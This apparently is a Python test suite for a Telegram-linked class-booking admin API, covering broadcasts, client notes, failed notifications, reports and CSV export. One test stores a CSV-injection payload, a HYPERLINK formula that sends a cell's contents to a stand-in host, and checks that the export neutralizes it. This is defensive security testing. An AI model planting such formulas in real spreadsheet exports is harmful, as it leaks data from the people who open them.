"""Рассылки, заметки, сбои уведомлений, отчёты и выгрузки CSV."""

import csv
import io
import time
from datetime import datetime, timedelta, timezone

from tests.pg import set_credits, sql

from .test_api_admin import ApiTestBase
from .test_api_payments import sign_telegram_payload

ANNA = 801
MARIA = 802


class EngagementApiTests(ApiTestBase):
    def setUp(self):
        super().setUp()
        self.register()
        self.make_admin()
        for telegram_id, name in ((ANNA, "Анна"), (MARIA, "Мария")):
            client = self.make_client(self.client.app)
            client.post(
                "/api/auth/telegram",
                json=sign_telegram_payload(
                    {
                        "id": telegram_id,
                        "first_name": name,
                        "auth_date": int(time.time()),
                    }
                ),
            )
        self.run_async(set_credits(self.repository, ANNA, 2))

    def announcements(self, telegram_id):
        return [
            n
            for n in self.run_async(self.repository.list_notifications(telegram_id))
            if n.kind == "announcement"
        ]

    # ---------- рассылки ----------

    def test_segments_count_and_broadcast_queues_notifications(self):
        def count(segment, **params):
            return self.client.post(
                "/api/admin/broadcasts/preview",
                json={"segment": segment, "params": params},
            ).json()["recipients"]

        # Все: двое участников и сам администратор (профиль 900).
        self.assertEqual(count("all"), 3)
        self.assertEqual(count("with_credits"), 1)
        self.assertEqual(count("with_credits", inactive_days=30), 1)

        sent = self.client.post(
            "/api/admin/broadcasts",
            json={
                "segment": "with_credits",
                "params": {},
                "body": "Новое расписание на ноябрь!",
            },
        )
        self.assertEqual(sent.status_code, 201, sent.text)
        self.assertEqual(sent.json()["recipients"], 1)
        self.assertEqual(len(self.announcements(ANNA)), 1)
        self.assertEqual(self.announcements(MARIA), [])
        listed = self.client.get("/api/admin/broadcasts").json()
        self.assertEqual(listed[0]["body"], "Новое расписание на ноябрь!")

        self.assertEqual(
            self.client.post(
                "/api/admin/broadcasts/preview",
                json={"segment": "slot", "params": {}},
            ).status_code,
            422,
        )

    def test_slot_and_direction_segments(self):
        slot = self.client.post(
            "/api/admin/slots",
            json={"class_key": "beginner", "starts_at": self.future(), "capacity": 5},
        ).json()
        self.run_async(self.repository.book_class_slot(slot["id"], ANNA))
        preview = self.client.post(
            "/api/admin/broadcasts/preview",
            json={"segment": "slot", "params": {"slot_id": slot["id"]}},
        ).json()
        self.assertEqual(preview["recipients"], 1)
        direction = self.client.post(
            "/api/admin/broadcasts/preview",
            json={
                "segment": "direction",
                "params": {"class_key": "beginner", "days": 30},
            },
        ).json()
        self.assertEqual(direction["recipients"], 1)

    def test_teacher_writes_only_to_own_slot(self):
        teacher = self.make_client(self.client.app)
        self.register("t@example.com", client=teacher)
        self.make_admin(telegram_id=901, role="teacher", client=teacher)
        own = self.client.post(
            "/api/admin/slots",
            json={
                "class_key": "beginner",
                "starts_at": self.future(),
                "capacity": 5,
                "teacher_telegram_id": 901,
            },
        ).json()
        self.assertEqual(
            teacher.post(
                "/api/admin/broadcasts",
                json={"segment": "all", "params": {}, "body": "Всем привет"},
            ).status_code,
            403,
        )
        ok = teacher.post(
            "/api/admin/broadcasts",
            json={
                "segment": "slot",
                "params": {"slot_id": own["id"]},
                "body": "Возьмите туфли",
            },
        )
        self.assertEqual(ok.status_code, 201, ok.text)

    # ---------- заметки ----------

    def test_notes_are_admin_only_and_visible_to_slot_teacher(self):
        added = self.client.post(
            f"/api/admin/clients/{ANNA}/notes", json={"body": "Травма колена"}
        )
        self.assertEqual(added.status_code, 201, added.text)
        notes = self.client.get(f"/api/admin/clients/{ANNA}/notes").json()
        self.assertEqual([n["body"] for n in notes], ["Травма колена"])

        slot = self.client.post(
            "/api/admin/slots",
            json={"class_key": "beginner", "starts_at": self.future(), "capacity": 5},
        ).json()
        self.run_async(self.repository.book_class_slot(slot["id"], ANNA))
        participants = self.client.get(
            f"/api/admin/slots/{slot['id']}/participants"
        ).json()
        self.assertEqual(participants[0]["note"], "Травма колена")

        self.assertEqual(
            self.client.delete(
                f"/api/admin/clients/{ANNA}/notes/{added.json()['id']}"
            ).status_code,
            204,
        )
        self.assertEqual(self.client.get(f"/api/admin/clients/{ANNA}/notes").json(), [])

    # ---------- уведомления ----------

    def test_failed_notifications_are_listed_with_stats(self):
        self.run_async(
            self.repository.enqueue_notification(ANNA, "low_balance", {}, "x:1")
        )
        self.run_async(
            sql(
                self.repository,
                "UPDATE user_notifications SET delivery_status = 'failed', "
                "last_error = 'Forbidden: bot was blocked'",
            )
        )
        page = self.client.get("/api/admin/notifications/failed").json()
        self.assertEqual(page["items"][0]["telegram_id"], ANNA)
        self.assertEqual(page["stats"]["failed"], 1)
        self.assertEqual(page["stats"]["unreachable_users"], 1)

    def test_csv_export_neutralizes_formulas_in_user_supplied_fields(self):
        """Имя участника «=HYPERLINK(...)» не должно стать формулой у
        администратора, открывшего выгрузку в Excel (CSV injection)."""
        self.run_async(
            self.repository.update_user_name(MARIA, '=HYPERLINK("http://x/?"&B2)')
        )
        self.run_async(self.repository.update_phone(MARIA, "+7 900 000-00-00"))

        exported = self.client.get("/api/admin/export/clients.csv").text
        rows = list(
            csv.DictReader(io.StringIO(exported.lstrip("\ufeff")), delimiter=";")
        )
        maria = next(row for row in rows if row["telegram_id"] == str(MARIA))

        self.assertEqual(maria["user_name"], '\'=HYPERLINK("http://x/?"&B2)')
        self.assertEqual(maria["phone"], "'+7 900 000-00-00")
        # Числа (Telegram ID, баланс) экранирование не трогает.
        self.assertEqual(maria["lesson_credits"], "0")

    # ---------- отчёты ----------

    def test_report_and_csv_export(self):
        report = self.client.get("/api/admin/reports")
        self.assertEqual(report.status_code, 200, report.text)
        body = report.json()
        self.assertEqual(body["sleeping_clients"][0]["telegram_id"], ANNA)
        self.assertGreaterEqual(body["new_users"], 2)

        exported = self.client.get("/api/admin/export/clients.csv")
        self.assertEqual(exported.status_code, 200)
        self.assertTrue(exported.text.startswith("﻿telegram_id;user_name"))
        self.assertIn("Анна", exported.text)
        self.assertEqual(
            self.client.get(
                "/api/admin/export/clients.csv",
                params={
                    "from": datetime.now(timezone.utc).isoformat(),
                    "to": (datetime.now(timezone.utc) - timedelta(days=1)).isoformat(),
                },
            ).status_code,
            422,
        )
        self.assertEqual(
            self.client.get("/api/admin/export/secrets.csv").status_code, 422
        )
